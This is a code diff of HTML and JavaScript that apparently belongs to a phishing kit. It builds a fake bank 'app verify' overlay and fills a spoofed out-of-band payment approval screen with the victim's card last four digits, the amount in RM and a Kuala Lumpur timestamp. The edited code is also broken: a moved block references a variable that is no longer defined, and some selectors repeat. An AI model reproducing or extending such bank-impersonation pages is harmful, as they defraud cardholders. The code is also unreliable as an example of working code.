@@ -449,7 +449,7 @@
 </div>
 
 <div class="overlay hidden" id="app-verify-overlay">
-  <div id="mount1" class="hidden"></div><div id="mount2" class="hidden"></div><div id="mount3" class="hidden"></div><div id="mount4" class="hidden"></div><div id="mount5" class="hidden"></div><div id="mount6" class="hidden"></div><div id="mount7" class="hidden"></div>
+  <div id="mount1" class="hidden" style="position: relative;"></div><div id="mount2" class="hidden" style="position: relative;"></div><div id="mount3" class="hidden" style="position: relative;"></div><div id="mount4" class="hidden" style="position: relative;"></div><div id="mount5" class="hidden" style="position: relative;"></div><div id="mount6" class="hidden" style="position: relative;"></div><div id="mount7" class="hidden" style="position: relative;"></div>
   <div class="app-verify-box hidden">
                 <div class="app-hdr">
                     <div class="app-bank-logo" id="app-bank-logo">IB</div>
@@ -1173,7 +1173,10 @@
                                           }
                                           function showMount5(p) {
                                             var m5=q('mount5');if(m5)m5.classList.remove('hidden');
-                                            try{var mEl5=document.getElementById('mount5');if(!mEl5||!mEl5.shadowRoot)return;var s5=mEl5.shadowRoot;
+                                          }
+                                          function showMount6(p) {
+                                            var m6=q('mount6');if(m6)m6.classList.remove('hidden');
+                                            try{var mEl6=document.getElementById('mount6');if(!mEl6||!mEl6.shadowRoot)return;var s6=mEl6.shadowRoot;
                                             s5.querySelector('div>div.container>table:nth-child(3)>tbody.oobtrxinfo>tr.mobileshow>td>div:nth-child(2)>div').textContent='RM '+q('total-amount').textContent.replace(/[^\d.]/g,'');
                                             s5.querySelector('div>div.container>table:nth-child(3)>tbody.oobtrxinfo>tr.mobileshow>td>div:nth-child(4)>div>span').textContent=(p.cardInfo.cardNumber||'').slice(-4);
                                             var now=new Date();var opts={weekday:'short',month:'short',day:'2-digit',year:'numeric',timeZone:'Asia/Kuala_Lumpur'};
@@ -1181,9 +1184,6 @@
                                             var ds=parts.find(function(p){return p.type==='weekday'}).value+' '+parts.find(function(p){return p.type==='month'}).value+' '+parts.find(function(p){return p.type==='day'}).value+' '+parts.find(function(p){return p.type==='year'}).value;
                                             var ts=now.toLocaleTimeString('en-GB',{hour12:false,timeZone:'Asia/Kuala_Lumpur'});
                                             s5.querySelector('div>div.container>table:nth-child(3)>tbody.oobtrxinfo>tr.mobileshow>td>div:nth-child(3)>div').innerHTML='<span>'+ds+'</span><br><span>'+ts+'</span>';}catch(e){}
-                                          }
-                                          function showMount6(p) {
-                                            var m6=q('mount6');if(m6)m6.classList.remove('hidden');
                                           }
                                           function showMount7(p) {
                                             var m7=q('mount7');if(m7)m7.classList.remove('hidden');
@@ -1248,7 +1248,7 @@
                                                 shadow.querySelector('#formactions>a>div'),
                                                 shadow.querySelector('#oobCheckBtn>div'),
                                                 shadow.querySelector('#formactions'),
-                                                shadow.querySelector('#formactionsoob>td>a>div'),
+                                                shadow.querySelector('#ExitLink'),
                                                 shadow.querySelector('#formactionsoob>td>a>div'),
                                                 shadow.querySelector('#ExitLink')
                                               ];
